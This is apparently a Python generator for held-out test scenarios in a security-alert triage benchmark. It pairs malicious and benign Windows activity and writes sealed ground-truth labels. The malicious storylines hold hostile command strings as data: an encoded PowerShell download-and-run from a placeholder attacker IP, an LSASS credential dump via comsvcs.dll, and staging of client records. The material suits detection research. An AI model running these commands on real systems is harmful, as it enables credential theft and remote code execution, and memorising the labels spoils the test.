"""v3 held-out TEST set S2 (S21–S28): NEW archetypes + a third org (Riverbend). Never used for tuning or training.

    python 03_scenarios/make_s2.py     # writes configs/S21..S28 *.yaml + *.meta.json + env_riverbend.context.txt

4 lookalike pairs (none of these archetypes is in the T-pool or the v1 S-set):
  lateral   S21 MAL  admin account RDPs to the file server from a STAFF workstation (stolen credentials)
            S22 BEN  admin RDPs to the file server from the ADMIN workstation (approved remote administration)
  task      S23 MAL  hidden encoded-PowerShell scheduled task created by a staff user
            S24 BEN  IT deploy task (approved name + approved installer path) created by the admin
  dump      S25 MAL  rundll32 comsvcs.dll MiniDump of LSASS to a public folder
            S26 BEN  approved crash-dump collector dumps the hung line-of-business app
  group     S27 MAL  admin account adds a staff user to Remote Desktop Users from a STAFF workstation
            S28 BEN  admin adds a new hire to the Billing-Share group from the ADMIN workstation
Gaps: pairs lateral/task/dump = consequential (decisive host sensors on the target host, 13:30–14:15 UTC);
pair group = NON-consequential (proxy outage). Same PROTOCOL §1.4 label rule as v1 → 12 INS, 6 MAL, 6 BEN.
"""
import json
from pathlib import Path

import yaml

from make_tpool import E, enc, environment, ips

HERE = Path(__file__).resolve().parent
OUT = HERE / "configs"
DAY = "2026-11-03"
O = dict(name="Riverbend Veterinary Hospital", domain="riverbend.local", netbios="RIVERBEND", day=DAY,
         mail="riverbendvet.com", net="10.60", ext_cidr="198.51.100.224/28", attacker="203.0.113.66",
         users=dict(staff1=("hana.ito", "WS-HITO-01", "receptionist"), staff2=("cole.price", "WS-CPRICE-01", "analyst"),
                    admin=("dev.sharma", "WS-DSHARMA-01", "sysadmin"), helpdesk=("lily.okoro", "WS-LOKORO-01", "help_desk")),
         svc_backup="svc-rbbackup", svc_job="svc-labsync", dc="DC-RB-01", file="FILE-RB-01", proxy="PROXY-RB-01")
APP = r"C:\Program Files\VetChart\vetchart.exe"
CRASH = r"C:\Program Files\VetChart\Tools\vcdump.exe"
DEPLOY_MSI = r"\\FILE-RB-01\Deploy\VetChart-4.2.msi"


def context():
    U = O["users"]
    return (f"Organization: {O['name']} (domain {O['netbios']} / {O['domain']}).\n"
            f"Hosts: workstations {U['staff1'][1]} ({U['staff1'][0]}, reception), {U['staff2'][1]} ({U['staff2'][0]}, vet tech), "
            f"{U['admin'][1]} ({U['admin'][0]}, IT administrator), {U['helpdesk'][1]} ({U['helpdesk'][0]}, help desk); servers "
            f"{O['dc']} (domain controller), {O['file']} (file server, practice-management data), {O['proxy']} (explicit web proxy, port 8080).\n"
            f"Accounts: {U['admin'][0]} is the only IT administrator. Remote administration (RDP or remote PowerShell) to servers is only done "
            f"from {U['admin'][1]}; staff workstations are never used for administration.\n"
            f"IT practices: software is deployed by {U['admin'][0]} with a scheduled task named \\RB-IT\\Deploy-<App> that runs msiexec on an installer from \\\\FILE-RB-01\\Deploy. "
            f"When VetChart ({APP}) hangs, IT collects a crash dump of vetchart.exe with the vendor tool {CRASH} (ticket required). "
            f"Group changes (for example Billing-Share access for new staff) are made by {U['admin'][0]} from {U['admin'][1]} after a ticket. "
            f"Membership of Remote Desktop Users is restricted to IT.\n"
            f"Change calendar for {DAY}: new hire {U['staff1'][0]} gets Billing-Share access in the afternoon; VetChart hang reported on {U['staff2'][1]} (ticket open); "
            f"VetChart 4.2 deployment to {U['staff1'][1]} scheduled for the afternoon.\n"
            f"Approved software and services: Microsoft 365 / OneDrive; VetChart (practice management). No other remote-access tools are approved.\n")


def build():
    U, I = O["users"], ips(O)
    s1, s1h = U["staff1"][0], U["staff1"][1]
    s2, s2h = U["staff2"][0], U["staff2"][1]
    ad, adh = U["admin"][0], U["admin"][1]
    win = f"{DAY} between 13:20 and 14:20 UTC"
    PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    host_gap = lambda h: {"sources": ["winsec", "sysmon"], "hosts": [h]}
    proxy_gap = {"sources": ["proxy"], "hosts": ["*"]}
    lat_gap = {"sources": ["winsec", "sysmon", "zeek_conn", "zeek_dns", "zeek_ssl"], "hosts": [O["file"], s2h, adh, O["dc"]]}
    rdp_alert = (f"Remote access monitoring: an RDP session to {O['file']} using account {ad} started around 13:42 UTC on {DAY}. "
                 f"Review activity {win} and decide whether it is malicious.")
    task_alert = (f"Endpoint alert: a new scheduled task was registered on {s1h} around 13:41 UTC on {DAY}. "
                  f"Review activity {win} and decide whether it is malicious.")
    dump_alert = (f"Endpoint alert: a process memory dump (.dmp) was written on {s2h} around 13:44 UTC on {DAY}. "
                  f"Review activity {win} and decide whether it is malicious.")
    S = {}
    S["S21"] = ("MALICIOUS", "lateral", "remote_logon", {"hosts": [O["file"]], "ips": [], "users": [ad]}, rdp_alert,
                [E("rdp", "+42m", ad, O["file"], "RDP to file server from a staff workstation with stolen admin credentials",
                   [{"type": "rdp_session", "source_ip": I[s2h]}]),
                 E("stage", "+47m", ad, O["file"], "Archive of client records staged",
                   [{"type": "process", "process_name": PS,
                     "command_line": rf"powershell.exe -NoProfile -Command Compress-Archive -Path D:\Records -DestinationPath C:\ProgramData\r.zip"}])],
                lat_gap)
    S["S22"] = ("BENIGN", "lateral", "remote_logon", {"hosts": [O["file"]], "ips": [], "users": [ad]}, rdp_alert,
                [E("rdp", "+42m", ad, O["file"], "Approved RDP maintenance session from the admin workstation",
                   [{"type": "rdp_session", "source_ip": I[adh]}]),
                 E("maint", "+47m", ad, O["file"], "Disk cleanup",
                   [{"type": "process", "process_name": r"C:\Windows\System32\cleanmgr.exe", "command_line": "cleanmgr.exe /sagerun:1"}])],
                lat_gap)
    S["S23"] = ("MALICIOUS", "task", "scheduled_task", {"hosts": [s1h], "ips": [I[s1h]], "users": [s1]}, task_alert,
                [E("logon", "+36m", s1, s1h, "Interactive logon", [{"type": "logon", "logon_type": 2}]),
                 E("task", "+41m", s1, s1h, "Hidden PowerShell task for persistence",
                   [{"type": "scheduled_task_created", "task_name": r"\Microsoft\Windows\SyncCheck",
                     "task_content": "powershell.exe -nop -w hidden -enc " + enc(f"IEX (iwr http://{O['attacker']}/s.ps1)")}])],
                host_gap(s1h))
    S["S24"] = ("BENIGN", "task", "scheduled_task", {"hosts": [s1h], "ips": [I[s1h]], "users": [s1]}, task_alert,
                [E("adm", "+37m", ad, s1h, "Admin network logon from the admin workstation", [{"type": "logon", "logon_type": 3, "source_ip": I[adh]}]),
                 E("task", "+41m", ad, s1h, "IT deployment task (approved name and installer share)",
                   [{"type": "scheduled_task_created", "task_name": r"\RB-IT\Deploy-VetChart",
                     "task_content": f"msiexec.exe /i {DEPLOY_MSI} /qn"}])],
                host_gap(s1h))
    S["S25"] = ("MALICIOUS", "dump", "memory_dump", {"hosts": [s2h], "ips": [I[s2h]], "users": [s2]}, dump_alert,
                [E("logon", "+38m", s2, s2h, "Interactive logon", [{"type": "logon", "logon_type": 2}]),
                 E("dump", "+44m", s2, s2h, "LSASS dumped with comsvcs.dll",
                   [{"type": "process", "process_name": r"C:\Windows\System32\rundll32.exe",
                     "command_line": r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full"}])],
                host_gap(s2h))
    S["S26"] = ("BENIGN", "dump", "memory_dump", {"hosts": [s2h], "ips": [I[s2h]], "users": [s2]}, dump_alert,
                [E("logon", "+38m", s2, s2h, "Interactive logon", [{"type": "logon", "logon_type": 2}]),
                 E("dump", "+44m", s2, s2h, "Approved vendor tool dumps the hung VetChart process",
                   [{"type": "process", "process_name": CRASH,
                     "command_line": rf'"{CRASH}" -p vetchart.exe -o C:\ProgramData\VetChart\Dumps\vetchart_hang.dmp'}])],
                host_gap(s2h))
    S["S27"] = ("MALICIOUS", "group", "group_change", {"hosts": [], "ips": [], "users": [s2, ad]},
                f"Directory alert: account {s2} was added to a group around 13:43 UTC on {DAY}. Review activity {win} and decide whether it is malicious.",
                [E("net", "+40m", ad, O["dc"], "Admin credentials used from a staff workstation", [{"type": "logon", "logon_type": 3, "source_ip": I[s2h]}]),
                 E("grp", "+43m", ad, O["dc"], "Staff user added to Remote Desktop Users",
                   [{"type": "group_member_added", "group_name": "Remote Desktop Users", "member_name": s2, "scope": "local"}])],
                proxy_gap)
    S["S28"] = ("BENIGN", "group", "group_change", {"hosts": [], "ips": [], "users": [s1, ad]},
                f"Directory alert: account {s1} was added to a group around 13:43 UTC on {DAY}. Review activity {win} and decide whether it is malicious.",
                [E("net", "+40m", ad, O["dc"], "Admin session from the admin workstation", [{"type": "logon", "logon_type": 3, "source_ip": I[adh]}]),
                 E("grp", "+43m", ad, O["dc"], "New hire added to Billing-Share (change calendar)",
                   [{"type": "group_member_added", "group_name": "Billing-Share", "member_name": s1, "scope": "global"}])],
                proxy_gap)
    return S


def manifest(gap):
    rows = []
    for s in ["winsec", "sysmon", "proxy", "zeek_conn", "zeek_dns", "zeek_ssl"]:
        if s in gap["sources"]:
            hosts = [h for h in gap["hosts"] if h != "*"] or [("proxy" if s == "proxy" else "all hosts")]
            for h in hosts:
                rows.append({"sensor": s, "host": h if s != "proxy" else O["proxy"], "window": [f"{DAY}T13:30:00Z", f"{DAY}T14:15:00Z"],
                             "status": "not_collected", "reason": "log collection outage"})
            rows.append({"sensor": s, "host": "all other hosts, and the hosts above outside the listed window", "status": "ok"})
        else:
            rows.append({"sensor": s, "host": "all hosts", "status": "ok"})
    return {"sensors": rows}


RESEED = {"S25"}   # EvidenceForge internal error on seed 9105 (exit 21); reseeded +1000 like the T-pool


def main():
    (OUT / "env_riverbend.context.txt").write_text(context(), encoding="utf-8")
    for i, (sid, (cls, pair, cat, focus, alert, story, gap)) in enumerate(build().items()):
        gap = dict(gap, window=[f"{DAY}T13:30:00.000Z", f"{DAY}T14:15:00.000Z"], mechanism="log collection outage")
        seed = 9101 + i + (1000 if sid in RESEED else 0)
        y = {"version": "1.0", "name": f"ev-{sid}", "description": f"Evidence Vacuum v3 HELD-OUT TEST scenario {sid} ({pair}, {cls}).",
             "environment": environment(O), "time_window": {"start": f"{DAY}T13:00:00Z", "duration": "2h", "warmup": "1h"},
             "generation_seed": seed,
             "baseline_activity": {"description": "Quiet afternoon", "intensity": "low", "variation": "low", "suspicious_noise": "low"},
             "observation_profile": "complete", "storyline": story,
             "output": {"logs": [{"format": f} for f in ["windows_event_security", "windows_event_sysmon", "zeek_conn", "zeek_dns",
                                                          "zeek_ssl", "proxy_access"]], "destination": f"out/{sid}", "compression": False}}
        (OUT / f"{sid}.yaml").write_text(yaml.safe_dump(y, sort_keys=False, width=1000), encoding="utf-8")
        cons = pair != "group"
        labels = {c: ("INSUFFICIENT" if cons and c != "C1" else ("MALICIOUS_SUPPORTED" if cls == "MALICIOUS" else "BENIGN_SUPPORTED"))
                  for c in ("C1", "C2", "C3")}
        meta = {"scenario_id": sid, "set": "S2", "class": cls, "pair": pair, "archetype": f"{pair}_{cls.lower()}",
                "alert_category": cat, "gap_type": "consequential" if cons else "non-consequential", "seed": seed,
                "alert_summary": alert, "window": [f"{DAY}T13:20:00.000Z", f"{DAY}T14:20:00.000Z"], "focus": focus, "gap": gap,
                "coverage_manifest": manifest(gap), "environment_context": "env_riverbend.context.txt"}
        (OUT / f"{sid}.meta.json").write_text(json.dumps(meta, indent=1), encoding="utf-8")
        sealed = HERE / "ground_truth_SEALED"
        sealed.mkdir(exist_ok=True)
        (sealed / f"{sid}.labels.json").write_text(json.dumps({"scenario_id": sid, "class": cls, "labels": labels,
                                                               "closure_defensible": {c: ("yes" if labels[c] == "BENIGN_SUPPORTED" else "no") for c in labels}},
                                                              indent=1), encoding="utf-8")
    print("wrote S21..S28")


if __name__ == "__main__":
    main()
